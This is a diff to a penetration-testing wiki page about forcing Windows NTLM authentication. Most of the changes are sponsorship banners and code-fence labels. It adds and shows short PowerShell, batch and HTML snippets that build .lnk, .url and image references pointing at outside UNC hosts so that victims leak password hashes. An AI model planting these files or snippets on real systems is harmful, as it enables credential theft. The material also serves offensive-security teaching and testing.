@@ -2,17 +2,17 @@
 
 <details>
 
-<summary><strong>Support HackTricks and get benefits!</strong></summary>
+<summary><strong><a href="https://www.twitch.tv/hacktricks_live/schedule">🎙️ HackTricks LIVE Twitch</a> Wednesdays 5.30pm (UTC) 🎙️ - <a href="https://www.youtube.com/@hacktricks_LIVE">🎥 Youtube 🎥</a></strong></summary>
 
-Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
 
-Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
 
-Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 
-**Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**
 
-**Share your hacking tricks submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**
+- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
 
@@ -237,7 +237,7 @@ IconIndex=1337
 
 We can create a shortcut containing our network path and as you as you open the shortcut Windows will try to resolve the network path. You can also specify a keyboard shortcut to trigger the shortcut. For the icon you can give the name of a Windows binary or choose an icon from either shell32.dll, Ieframe.dll, imageres.dll, pnidui.dll or wmploc.dll located in the system32 directory.
 
-```
+```powershell
 Set shl = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 currentFolder = shl.CurrentDirectory
@@ -254,7 +254,8 @@ sc.Save
 
 The Powershell version.
 
-```
+```powershell
+#TargetPath attack
 $objShell = New-Object -ComObject WScript.Shell
 $lnk = $objShell.CreateShortcut("StealMyHashes.lnk")
 $lnk.TargetPath = "\\35.164.153.224\@OsandaMalith"
@@ -263,13 +264,19 @@ $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
 $lnk.Description = "I will Steal your Hashes"
 $lnk.HotKey = "Ctrl+Alt+O"
 $lnk.Save()
+
+#IconLocation Attack
+$wsh = new-object -ComObject wscript.shell
+$shortcut = $wsh.CreateShortcut("\\dc\software\test.lnk")
+$shortcut.IconLocation = "\\10.10.10.10\test.ico"
+$shortcut.Save()
 ```
 
 ## Internet Shortcuts (.url)
 
 Another shortcut in Windows is the Internet shortcuts. You can save this as something.url
 
-```
+```bash
 echo [InternetShortcut] > stealMyHashes.url 
 echo URL=file://192.168.0.1/@OsandaMalith >> stealMyHashes.url
 ```
@@ -301,7 +308,7 @@ Start-Process \\192.168.0.1\aa
 
 IE will resolve UNC paths. For example
 
-```
+```html
 <img src="\\\\192.168.0.1\\aa">
 ```
 
@@ -680,16 +687,16 @@ There might be many other ways in Windows. You never know! 🙂
 
 <details>
 
-<summary><strong>Support HackTricks and get benefits!</strong></summary>
+<summary><strong><a href="https://www.twitch.tv/hacktricks_live/schedule">🎙️ HackTricks LIVE Twitch</a> Wednesdays 5.30pm (UTC) 🎙️ - <a href="https://www.youtube.com/@hacktricks_LIVE">🎥 Youtube 🎥</a></strong></summary>
 
-Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
 
-Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
 
-Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 
-**Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**
 
-**Share your hacking tricks submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**
+- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
